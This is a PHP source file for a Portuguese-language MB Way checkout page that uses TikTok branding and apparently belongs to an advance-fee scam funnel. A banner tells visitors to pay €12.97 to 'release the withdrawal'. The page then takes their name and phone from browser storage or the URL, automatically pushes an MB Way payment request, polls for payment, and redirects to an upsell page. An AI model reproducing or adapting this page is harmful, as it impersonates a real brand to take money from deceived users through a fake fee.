<?php
/**
 * checkout.php
 * - GET: pagina de checkout (inicia transacao e faz polling)
 * - POST: adapter legado (create-pix -> create-transaction)
 */

function checkout_json($code, $payload) {
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

require_once __DIR__ . '/central.php';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');
    ?>
<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
  !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
  ttq.load('D701J2RC77UANC7P0LQ0');
  ttq.page();
  ttq.track('InitiateCheckout', { 
    contents: [{
      content_id: 'front-checkout',
      content_name: 'Produto Principal',
      content_type: 'product'
    }],
    value: <?= json_encode(central_price('front', 12.97)) ?>, 
    currency: 'EUR' 
  });
  }(window,document,'ttq');
  </script>
  <style>
    * { box-sizing: border-box; }
    body { font-family: 'Inter', Arial, sans-serif; background: #fff; color: #161823; margin: 0; }
    .topbar {
      background: #000; color: #fff; text-align: center; padding: 8px 12px;
      font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .02em;
      position: sticky; top: 0; z-index: 20;
    }
    .wrap { max-width: 430px; margin: 0 auto; min-height: 100vh; background: #fff; padding-bottom: 20px; }
    .header-brand {
      padding: 16px 20px 14px;
      border-bottom: 1px solid rgb(187, 187, 187);
      background: #fff;
      text-align: center;
    }
    .logo-head { width: 112px; height: 55p; object-fit: contain; margin: 0 auto; display: block; }
    .hero {
      padding: 16px 20px 14px;
      text-align: center;
    }
    .hero-label { font-size: 11px; color: #9ca3af; font-weight: 700; text-transform: uppercase; letter-spacing: .15em; }
    .hero-amount { margin-top: 6px; font-size: 44px; line-height: 1; font-weight: 900; letter-spacing: -.03em; }
    .tt-balance .bg-foreground { background: #0b0b0b; }
    .box { margin: 16px 16px 0; border: 1px solid #eceff5; border-radius: 14px; background: #fff; overflow: hidden; }
    .countdown-card {
      margin: 16px;
      border: 1px solid #f7c8d5;
      border-radius: 12px;
      padding: 12px 14px;
      background: #fff5f8;
      text-align: center;
    }
    .countdown-title {
      margin: 0 0 4px;
      font-size: 12px;
      color: #9f1239;
      font-weight: 700;
      letter-spacing: .02em;
      text-transform: uppercase;
    }
    .countdown-time {
      margin: 0;
      font-size: 34px;
      line-height: 1;
      font-weight: 900;
      color: #FE2C55;
      letter-spacing: .06em;
      font-variant-numeric: tabular-nums;
    }
    .countdown-note {
      margin: 6px 0 0;
      font-size: 12px;
      color: #7a2741;
    }
    .row { padding: 12px 14px; border-bottom: 1px solid #f2f4f8; }
    .row:last-child { border-bottom: 0; }
    .label { font-size: 12px; color: #6b7280; margin-bottom: 5px; font-weight: 600; }
    .value { font-size: 28px; font-weight: 900; letter-spacing: .4px; word-break: break-word; color: #FE2C55; }
    .value.small { font-size: 22px; }
    .inline-copy { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
    .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 12px 14px 14px; }
    .btn {
      border: 1px solid #dfe5f1; border-radius: 10px; padding: 11px 10px; background: #fff; color: #0f172a;
      font-weight: 700; cursor: pointer; box-shadow: 0 2px 6px rgba(15,23,42,.05);
    }
    .btn-copy-inline {
      border: 1px solid #dfe5f1; border-radius: 9px; padding: 7px 10px; background: #fff; color: #0f172a;
      font-weight: 700; font-size: 12px; cursor: pointer; white-space: nowrap;
    }
    .btn-copy-inline:hover { background: #f9fbff; }
    .btn:hover { background: #f9fbff; }
    .hint { margin: 14px 16px 0; color: #6b7280; font-size: 12px; text-align: center; }
    .pay-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.58);
      z-index: 9998;
      justify-content: center;
      align-items: flex-end;
      padding: 0;
    }
    .pay-sheet {
      background: #fff;
      border-radius: 22px 22px 0 0;
      padding: 22px 18px 34px;
      width: 100%;
      max-width: 430px;
      margin: 0 auto;
      text-align: center;
    }
    .pay-phone-icon {
      width: 36px;
      height: 36px;
      margin: 0 auto 10px;
      color: #111827;
      display: block;
    }
    .pay-title { margin: 0 0 6px; font-size: 30px; font-weight: 900; color: #111827; letter-spacing: -.02em; }
    .pay-sub { margin: 0 0 14px; font-size: 15px; color: #6b7280; line-height: 1.45; }
    .pay-sub strong { color: #111827; font-weight: 800; }
    .pay-error-text {
      margin: 0 0 14px;
      color: #e11d48;
      font-size: 13px;
      font-weight: 700;
      line-height: 1.4;
    }
    .pay-dots { display: flex; justify-content: center; gap: 8px; margin: 10px 0 14px; }
    .pay-dot { width: 7px; height: 7px; border-radius: 999px; background: #FE2C55; animation: pay-bounce 1.2s infinite ease-in-out; }
    .pay-dot:nth-child(2) { animation-delay: .2s; }
    .pay-dot:nth-child(3) { animation-delay: .4s; }
    .pay-btn-secondary {
      border: 1px solid #e5e7eb;
      border-radius: 999px;
      background: #fff;
      color: #6b7280;
      padding: 9px 20px;
      font-size: 13px;
      cursor: pointer;
    }
    @keyframes pay-bounce {
      0%, 80%, 100% { transform: scale(.65); opacity: .55; }
      40% { transform: scale(1); opacity: 1; }
    }
    .hidden { display: none !important; }
    .loading-screen {
      position: fixed;
      inset: 0;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 20px;
    }
    .loading-card {
      text-align: center;
    }
    .loading-spinner-wrap {
      width: 132px;
      height: 132px;
      margin: 0 auto 14px;
      position: relative;
    }
    .loading-spinner {
      width: 132px;
      height: 132px;
      position: absolute;
      inset: 0;
      animation: spin 1.05s linear infinite;
    }
    .loading-spinner::before,
    .loading-spinner::after {
      content: "";
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 8px solid transparent;
    }
    .loading-spinner::before {
      border-top-color: #25f4ee;
      border-right-color: #25f4ee;
      filter: drop-shadow(0 0 8px rgba(37, 244, 238, 0.6));
    }
    .loading-spinner::after {
      inset: 12px;
      border-bottom-color: #fe2c55;
      border-left-color: #fe2c55;
      animation: spin-reverse 0.95s linear infinite;
      filter: drop-shadow(0 0 8px rgba(254, 44, 85, 0.55));
    }
    .loading-center-logo {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 72px;
      height: 72px;
      background: transparent;
      padding: 0;
      border-radius: 0;
      box-shadow: none;
      animation: none;
      z-index: 2;
      display: block;
    }
    .loading-title {
      font-size: 15px;
      font-weight: 800;
      color: #111827;
      margin: 0 0 6px;
    }
    .loading-subtitle {
      font-size: 13px;
      color: #6b7280;
      margin: 0;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes spin-reverse { to { transform: rotate(-360deg); } }
  </style>
  <!-- UTMify TikTok Pixel -->
  <script>
    window.tikTokPixelId = "69e5b7f8ad32f7063e007f4f";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
    document.head.appendChild(a);
  </script>
  <!-- UTMify TikTok Pixel End -->
</head>
<body>
  <div id="loadingScreen" class="loading-screen">
    <div class="loading-card">
      <div class="loading-spinner-wrap">
        <div class="loading-spinner"></div>
        <svg class="loading-center-logo" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 461 512.235" aria-label="TikTok">
          <g fill-rule="nonzero">
            <path fill="#2DCCD3" d="M370.934 98.964c19.378 19.981 43.543 32.158 67.898 37.7v-15.005c-22.884-1.621-46.823-8.822-67.898-22.695zM230.952 0v335.533c0 43.959-31.593 72.234-70.009 72.234-12.743 0-24.844-2.978-35.363-8.483 13.346 17.041 34.421 26.843 57.531 26.843 38.417 0 70.01-28.275 70.01-72.272V18.322h60.886C312.348 12.479 310.99 6.371 309.934 0h-78.982zM181 195.062v-16.627c-7.691-1.281-15.382-1.696-21.753-1.696C72.573 176.739 0 246.296 0 332.555c0 56.626 27.559 105.033 69.444 133.685-29.18-28.953-47.276-69.481-47.276-115.362 0-86.109 72.347-155.628 158.832-155.816z"/>
            <path fill="#F1204A" d="M318.87 329.991c0 107.144-81.96 163.921-159.209 163.921-33.44 0-64.505-10.103-90.217-27.672 28.879 28.652 68.616 45.995 112.385 45.995 77.248 0 159.208-56.777 159.208-163.921V173.723c-7.69-5.203-15.08-11.272-22.167-18.36v174.628zm-193.289 69.294c-9.426-11.914-15.043-27.334-15.043-45.43 0-50.782 39.698-77.624 92.629-72.045v-85.052c-7.69-1.282-15.381-1.697-21.79-1.697H181v68.389c-52.931-5.542-92.63 21.263-92.63 72.083 0 29.707 15.193 52.252 37.211 63.752zm313.251-262.621v63.525c-35.174 0-68.464-6.711-97.795-26.466 34.157 34.157 75.59 44.826 119.963 44.826v-78.567a137.713 137.713 0 01-22.168-3.318zm-67.898-37.701c-18.737-19.265-33.026-45.806-38.832-80.641h-18.095c10.329 37.663 31.592 63.94 56.927 80.641z"/>
            <path d="M159.661 493.912c77.248 0 159.209-56.777 159.209-163.921V155.364c7.088 7.087 14.477 13.157 22.168 18.359 29.33 19.755 62.62 26.466 97.794 26.466v-63.525c-24.354-5.542-48.52-17.72-67.898-37.7-25.335-16.702-46.597-42.979-56.928-80.641H253.12v335.533c0 43.996-31.593 72.271-70.009 72.271-23.111 0-44.185-9.801-57.531-26.842-22.017-11.499-37.21-34.044-37.21-63.751 0-50.821 39.698-77.626 92.63-72.084v-68.388c-86.485.189-158.832 69.708-158.832 155.815 0 45.882 18.096 86.409 47.277 115.363 25.711 17.569 56.776 27.672 90.216 27.672z"/>
          </g>
        </svg>
      </div>
      <p class="loading-title">Gerando sua cobranca</p>
      <p class="loading-subtitle">Aguarde alguns segundos...</p>
    </div>
  </div>
  <div class="topbar">Finalize o pagamento para libertar o levantamento</div>
  <div id="checkoutWrap" class="max-w-md mx-auto min-h-screen pb-12 bg-white hidden">
    <section class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-100 bg-white">
      <img src="assets/tiktok-logo-CtJns-A9.png" alt="TikTok Logo" class="h-24 w-24 object-contain mb-4">
      <div class="text-center">
        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Valor do Pagamento</p>
        <h2 class="text-5xl font-black text-[#161823] tracking-tighter" id="amount">€ 12.97</h2>
      </div>
    </section>

    <div class="px-6 py-6">
      <div class="rounded-2xl border border-gray-200 overflow-hidden bg-white p-4">
        <p class="text-xs font-semibold text-gray-500 mb-2">Método de Pagamento</p>
        <div class="flex items-center gap-2">
          <img src="assets/mb.png" alt="MB Way" class="h-6 w-auto object-contain">
          <p class="text-lg font-black text-[#FE2C55] leading-none">MB Way</p>
        </div>
        <p class="text-sm text-gray-600 mt-3">Vamos enviar uma notificação para o teu telemóvel para confirmares o pagamento com segurança.</p>
      </div>

      <div class="countdown-card">
      <p class="countdown-title">Tempo restante para concluir o pagamento</p>
      <p id="countdown" class="countdown-time">05:00</p>
      <p class="countdown-note">Efetue o pagamento dentro deste prazo para garantir a validação automática.</p>
      </div>

      <div class="hint">Após o pagamento, a confirmação pode demorar alguns segundos.</div>
    </div>
  </div>
  <div id="payOverlay" class="pay-overlay">
    <div class="pay-sheet">
      <div id="payFormSection">
        <svg class="pay-phone-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <rect x="7" y="2.5" width="10" height="19" rx="2" stroke="currentColor" stroke-width="1.8"></rect>
          <circle cx="12" cy="18" r="1.2" fill="currentColor"></circle>
        </svg>
        <h3 class="pay-title">A ligar ao MB Way</h3>
        <p class="pay-sub">Estamos a enviar a notificação de pagamento de <strong id="paySubtitle">€ 0,00</strong>.</p>
        <div class="pay-dots"><span class="pay-dot"></span><span class="pay-dot"></span><span class="pay-dot"></span></div>
      </div>
      <div id="payWaitingSection" class="hidden">
        <svg class="pay-phone-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <rect x="7" y="2.5" width="10" height="19" rx="2" stroke="currentColor" stroke-width="1.8"></rect>
          <circle cx="12" cy="18" r="1.2" fill="currentColor"></circle>
        </svg>
        <h3 class="pay-title" style="font-size:32px;">Aguarda a notificação MB Way</h3>
        <p class="pay-sub">Abre o app MB Way e confirma o pagamento de <strong id="payWaitingAmount">€ 0,00</strong>.</p>
        <div class="pay-dots"><span class="pay-dot"></span><span class="pay-dot"></span><span class="pay-dot"></span></div>
        <button id="payCancelBtn" class="pay-btn-secondary" type="button">Cancelar</button>
      </div>
      <div id="payErrorSection" class="hidden">
        <svg class="pay-phone-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <rect x="7" y="2.5" width="10" height="19" rx="2" stroke="currentColor" stroke-width="1.8"></rect>
          <circle cx="12" cy="18" r="1.2" fill="currentColor"></circle>
        </svg>
        <h3 class="pay-title" style="font-size:30px;">Não foi possível validar</h3>
        <p id="payErrorText" class="pay-error-text"></p>
        <button id="payBackBtn" class="pay-btn-secondary" type="button">Voltar e corrigir MB Way</button>
      </div>
    </div>
  </div>
  <script>
    (function() {
      var countdownEl = document.getElementById('countdown');
      var amountEl = document.getElementById('amount');
      var payOverlay = document.getElementById('payOverlay');
      var payFormSection = document.getElementById('payFormSection');
      var payWaitingSection = document.getElementById('payWaitingSection');
      var payErrorSection = document.getElementById('payErrorSection');
      var payErrorText = document.getElementById('payErrorText');
      var paySubtitle = document.getElementById('paySubtitle');
      var payWaitingAmount = document.getElementById('payWaitingAmount');
      var payCancelBtn = document.getElementById('payCancelBtn');
      var payBackBtn = document.getElementById('payBackBtn');
      var amount = <?= json_encode(central_price('front', 12.97)) ?>;
      var redirects = <?= json_encode(central_redirect('up1_entry', '/up1')) ?>;
      amountEl.textContent = '€ ' + amount.toFixed(2);
      paySubtitle.textContent = '€ ' + amount.toFixed(2);
      payWaitingAmount.textContent = '€ ' + amount.toFixed(2);
      var upPayId = null;
      var upPayInterval = null;
      var pollAttempts = 0;
      var pollErrorStreak = 0;
      var maxPollAttempts = 24; // ~2 minutos (24 x 5s)

      function startCountdown() {
        var total = 5 * 60;
        function render() {
          var min = Math.floor(total / 60);
          var sec = total % 60;
          countdownEl.textContent = String(min).padStart(2, '0') + ':' + String(sec).padStart(2, '0');
        }
        render();
        var timer = setInterval(function() {
          total -= 1;
          if (total < 0) {
            clearInterval(timer);
            countdownEl.textContent = '00:00';
            return;
          }
          render();
        }, 1000);
      }
      function showCheckout() {
        var loading = document.getElementById('loadingScreen');
        var wrap = document.getElementById('checkoutWrap');
        if (loading) loading.classList.add('hidden');
        if (wrap) wrap.classList.remove('hidden');
      }

      function openOverlay() {
        payOverlay.style.display = 'flex';
      }
      function showConnecting() {
        payFormSection.classList.remove('hidden');
        payWaitingSection.classList.add('hidden');
        payErrorSection.classList.add('hidden');
      }
      function showWaiting() {
        payFormSection.classList.add('hidden');
        payWaitingSection.classList.remove('hidden');
        payErrorSection.classList.add('hidden');
      }
      function showError(msg) {
        payErrorText.textContent = msg || 'Erro ao validar pagamento MB Way.';
        payFormSection.classList.add('hidden');
        payWaitingSection.classList.add('hidden');
        payErrorSection.classList.remove('hidden');
      }

      function normalizePhone(raw) {
        var d = String(raw || '').replace(/\D/g, '');
        if (d.indexOf('351') === 0) d = d.slice(3);
        return d;
      }

      function pickPayerFromStorage() {
        var out = { name: 'Cliente', phone: '', email: null };
        var buckets = [sessionStorage, localStorage];
        var keysHint = ['customer', 'customerData', 'withdraw', 'payer', 'mbway', 'form'];

        for (var b = 0; b < buckets.length; b++) {
          var st = buckets[b];
          for (var i = 0; i < st.length; i++) {
            var key = st.key(i);
            if (!key) continue;
            var keyLower = key.toLowerCase();
            var looksRelevant = keysHint.some(function(k){ return keyLower.indexOf(k) !== -1; });
            if (!looksRelevant) continue;
            try {
              var raw = st.getItem(key);
              var data = JSON.parse(raw);
              if (!data || typeof data !== 'object') continue;
              var n = data.name || data.fullName || data.payerName || (data.customerData && data.customerData.name);
              var p = data.phone || data.number || data.mbway || (data.customerData && (data.customerData.phone || data.customerData.number));
              var e = data.email || (data.customerData && data.customerData.email);
              if (n) out.name = n;
              if (p) out.phone = String(p);
              if (e) out.email = e;
            } catch (e) {}
          }
        }

        // fallback por querystring
        var q = new URLSearchParams(location.search);
        if (q.get('name')) out.name = q.get('name');
        if (q.get('phone')) out.phone = q.get('phone');
        if (q.get('email')) out.email = q.get('email');

        return out;
      }

      function checkUpPayment() {
        if (!upPayId) return;
        fetch('create-transaction.php?action=status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: upPayId })
        })
        .then(function(r){
          if (!r.ok) throw new Error('status_http_' + r.status);
          return r.json();
        })
        .then(function(st){
          pollAttempts += 1;
          pollErrorStreak = 0;
          if (st.status === 'paid') {
            clearInterval(upPayInterval);
            _utmify('paid', amount);
            if(window.ttq) ttq.track('CompletePayment', { 
              contents: [{
                content_id: 'front-checkout',
                content_name: 'Produto Principal',
                content_type: 'product'
              }],
              value: amount, 
              currency: 'EUR' 
            });
            var q = location.search || '';
            var target = redirects || '/up1';
            if (q) {
              target += (target.indexOf('?') === -1 ? q : '&' + q.slice(1));
            }
            setTimeout(function(){ location.href = target; }, 450);
            return;
          }
          if (st.status === 'failed') {
            clearInterval(upPayInterval);
            upPayInterval = null;
            showError('Pagamento rejeitado. Verifica o número MB Way e tenta novamente.');
            return;
          }
          if (pollAttempts >= maxPollAttempts) {
            clearInterval(upPayInterval);
            upPayInterval = null;
            showError('Não foi possível validar a notificação MB Way. Confirma se o número está correto e tenta novamente.');
          }
        })
        .catch(function(){
          pollErrorStreak += 1;
          if (pollErrorStreak >= 3) {
            clearInterval(upPayInterval);
            upPayInterval = null;
            showError('Erro ao validar o pagamento no MB Way. Tenta novamente.');
          }
        });
      }

      function submitCheckoutPayment(name, phoneDigits, email) {
        showConnecting();
        fetch('create-transaction.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            stage: 'front',
            method: 'mbway',
            amount: amount,
            payer: {
              name: name,
              phone: '+351' + phoneDigits,
              email: email || null,
              document: null
            }
          })
        })
        .then(function(r){ return r.json(); })
        .then(function(d){
          if (d.id || d.statusCode === 200) {
            upPayId = d.id || d.transaction_id || null;
            if (!upPayId) {
              showError('Não recebemos o identificador da transação MB Way. Tenta novamente.');
              return;
            }
            _utmify('waiting_payment', amount);
            pollAttempts = 0;
            pollErrorStreak = 0;
            if (upPayInterval) clearInterval(upPayInterval);
            showWaiting();
            upPayInterval = setInterval(checkUpPayment, 5000);
          } else {
            showError(d.message || 'Erro ao processar no MB Way. Verifica os dados e tenta novamente.');
          }
        })
        .catch(function(){
          showError('Erro de ligação. Tenta novamente.');
        });
      }

      function _utmify(st, amt) {
        var p = new URLSearchParams(window.location.search || '');
        var nm = (payer && payer.name) ? payer.name : '';
        fetch('tracking.php', {
          method: 'POST',
          keepalive: true,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            status: st,
            transaction_id: upPayId || ('front-' + Date.now()),
            amount: amt,
            method: 'mbway',
            product_id: 'front-checkout',
            product_name: 'TikTok - Front Checkout',
            customer: { name: nm, email: (payer && payer.email) || null, phone: null, document: null },
            utms: {
              utm_source: p.get('utm_source'),
              utm_medium: p.get('utm_medium'),
              utm_campaign: p.get('utm_campaign'),
              utm_content: p.get('utm_content'),
              utm_term: p.get('utm_term'),
              src: p.get('src'),
              sck: p.get('sck')
            }
          })
        }).catch(function(){});
      }

      payCancelBtn.addEventListener('click', function() {
        if (upPayInterval) clearInterval(upPayInterval);
        upPayInterval = null;
        upPayId = null;
        pollAttempts = 0;
        pollErrorStreak = 0;
        showError('Operação cancelada. Volta ao passo anterior para confirmar o MB Way.');
      });

      payBackBtn.addEventListener('click', function() {
        var q = location.search || '';
        location.href = '/confirmar-saque' + q;
      });

      var payer = pickPayerFromStorage();
      var phoneDigits = normalizePhone(payer.phone || '');

      startCountdown();
      showCheckout();
      openOverlay();

      if (payer.name && /^\d{9}$/.test(phoneDigits)) {
        submitCheckoutPayment(payer.name, phoneDigits, payer.email || null);
      } else {
        showError('Dados MB Way não encontrados. Volta ao passo anterior e preenche corretamente.');
      }
    })();
  </script>
</body>
</html>
<?php
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    checkout_json(405, ['error' => 'Method not allowed']);
}

$raw = file_get_contents('php://input');
$body = json_decode($raw, true) ?: [];
$amountCents = (int)($body['amount_cents'] ?? 0);
$amount = $amountCents > 0 ? ($amountCents / 100) : central_price('front', 12.97);

$customer = $body['customer'] ?? [];
if (!is_array($customer)) $customer = [];

$name = trim((string)($customer['name'] ?? $customer['payerName'] ?? 'Cliente'));
$phone = trim((string)($customer['phone'] ?? $customer['number'] ?? $customer['mbway'] ?? ''));
$email = trim((string)($customer['email'] ?? ''));
if ($email === '') $email = null;

$payload = [
    'method' => 'multibanco',
    'amount' => (float)$amount,
    'payer' => [
        'name' => $name !== '' ? $name : 'Cliente',
        'phone' => $phone,
        'email' => $email,
        'document' => null
    ]
];

$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$url = $scheme . '://' . $host . rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\') . '/create-transaction.php';

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlErr = curl_error($ch);
curl_close($ch);

if ($curlErr !== '') {
    checkout_json(502, ['error' => 'Erro ao chamar create-transaction local', 'details' => $curlErr]);
}

$resp = json_decode((string)$response, true);
if (!is_array($resp)) {
    checkout_json($httpCode > 0 ? $httpCode : 502, ['error' => 'Resposta invalida do create-transaction']);
}

$transactionId = $resp['id'] ?? $resp['transaction_id'] ?? ('tx-' . time());
$referenceData = $resp['referenceData'] ?? [];

// Retorno principal agora expõe a resposta completa da API para facilitar
// o desenho futuro do frontend.
checkout_json(200, [
    'api_response' => $resp,
    // Campos auxiliares (compatibilidade temporária)
    'transaction_id' => $transactionId,
    'status' => strtolower((string)($resp['status'] ?? 'pending')),
    'referenceData' => $referenceData,
]);

